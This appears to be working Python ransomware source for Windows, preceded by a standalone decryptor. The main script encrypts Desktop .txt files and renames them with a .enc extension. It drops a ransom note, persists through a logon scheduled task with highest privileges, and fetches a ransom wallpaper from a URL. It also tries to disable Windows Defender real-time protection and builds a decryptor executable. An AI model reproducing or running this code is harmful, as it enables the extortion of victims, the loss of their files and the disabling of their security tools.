import os
from cryptography.fernet import Fernet

# Decrypt a file
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Decrypt all files on the desktop
def decrypt_files_on_desktop(key):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            decrypt_file(os.path.join(root, file), key)

# Main function to run the decryption
def main():
    key = input("Enter the encryption key: ").encode()
    decrypt_files_on_desktop(key)

if __name__ == "__main__":
    main()
import os
import random
import string
import logging
import subprocess
import ctypes
from cryptography.fernet import Fernet
import sys
import urllib.request

# Configure logging
logging.basicConfig(filename=os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'encryption_log.txt'),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
CUSTOM_EXTENSION = ".enc"
EXE_NAME = "encrypt_desktop_files.exe"
DECRYPT_SCRIPT_NAME = "decrypt_files.py"
DECRYPT_EXE_NAME = "decrypt_files.exe"
WALLPAPER_URL = "https://example.com/path/to/your/ransomware-wallpaper.jpg"  # Replace with your image URL

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt a file and add custom extension
def encrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            original_data = file.read()
        encrypted_data = fernet.encrypt(original_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        new_file_path = file_path + CUSTOM_EXTENSION
        os.rename(file_path, new_file_path)
        logging.info(f"Encrypted and renamed: {new_file_path}")
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")

# Encrypt all .txt files on the desktop
def encrypt_files_on_desktop(key):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith('.txt') and file not in ['encryption_log.txt', 'RANSOM_NOTE.txt', EXE_NAME, DECRYPT_EXE_NAME]:
                encrypt_file(os.path.join(root, file), key)

# Create a ransom note on the desktop
def create_ransom_note():
    try:
        key = generate_key()
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        ransom_note_path = os.path.join(desktop_path, 'RANSOM_NOTE.txt')
        encryption_code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        ransom_message = (
            f"All of your files have been encrypted.\n"
            f"To unlock them contact me with your encryption code in this email@email.com.\n"
            f"Your encryption code is: {encryption_code}\n"
            f"Encryption key: {key.decode()}\n"
        )
        with open(ransom_note_path, 'w') as note:
            note.write(ransom_message)
        logging.info("Ransom note created")
        return key, encryption_code
    except Exception as e:
        logging.error(f"Failed to create ransom note: {e}")
        return None, None

# Add persistence by creating a scheduled task
def add_persistence():
    try:
        exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), EXE_NAME)
        task_name = "EncryptDesktopFiles"
        command = f'schtasks /create /tn {task_name} /tr "{exe_path}" /sc onlogon /rl highest /f'
        subprocess.run(command, shell=True)
        logging.info("Persistence added")
    except Exception as e:
        logging.error(f"Failed to add persistence: {e}")

# Create decryption script
def create_decryption_script(key):
    decryption_script = f"""
import os
from cryptography.fernet import Fernet

# Decrypt a file
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Decrypt all files on the desktop
def decrypt_files_on_desktop(key):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith('.enc'):
                decrypt_file(os.path.join(root, file), key)

# Main function to run the decryption
def main():
    key = "{key.decode()}"
    key = key.encode()
    decrypt_files_on_desktop(key)

if __name__ == "__main__":
    main()
"""
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    decryption_script_path = os.path.join(desktop_path, DECRYPT_SCRIPT_NAME)
    with open(decryption_script_path, 'w') as script_file:
        script_file.write(decryption_script)
    return decryption_script_path

# Check if PyInstaller is installed, and install if necessary
def check_and_install_pyinstaller():
    try:
        import PyInstaller
        logging.info("PyInstaller is already installed")
    except ImportError:
        logging.info("PyInstaller not found, installing...")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
        logging.info("PyInstaller installed successfully")

# Package decryption script into an executable
def package_decryption_script(decryption_script_path):
    check_and_install_pyinstaller()
    command = f'pyinstaller --onefile {decryption_script_path}'
    subprocess.run(command, shell=True)
    dist_path = 'dist'
    if os.path.exists(dist_path):
        decrypt_exe_path = os.path.join(dist_path, DECRYPT_EXE_NAME)
        final_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', DECRYPT_EXE_NAME)
        os.rename(decrypt_exe_path, final_path)
        logging.info(f"Decryption executable created: {final_path}")
    else:
        logging.error("Failed to create decryption executable")

# Change the desktop wallpaper
def change_wallpaper():
    try:
        wallpaper_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'ransomware_wallpaper.jpg')
        urllib.request.urlretrieve(WALLPAPER_URL, wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
        logging.info("Wallpaper changed")
    except Exception as e:
        logging.error(f"Failed to change wallpaper: {e}")

# Attempt to disable Windows Defender
def disable_windows_defender():
    try:
        command = 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'
        subprocess.run(command, shell=True)
        logging.info("Attempted to disable Windows Defender")
    except Exception as e:
        logging.error(f"Failed to disable Windows Defender: {e}")

# Main function to run the ransomware
def main():
    key, encryption_code = create_ransom_note()
    if key and encryption_code:
        encrypt_files_on_desktop(key)
        add_persistence()
        change_wallpaper()
        disable_windows_defender()
        decryption_script_path = create_decryption_script(key)
        package_decryption_script(decryption_script_path)
        logging.info(f"Files have been encrypted with the following encryption code: {encryption_code}")
    else:
        logging.error("Encryption process failed due to missing key or encryption code")

if __name__ == "__main__":
    main()
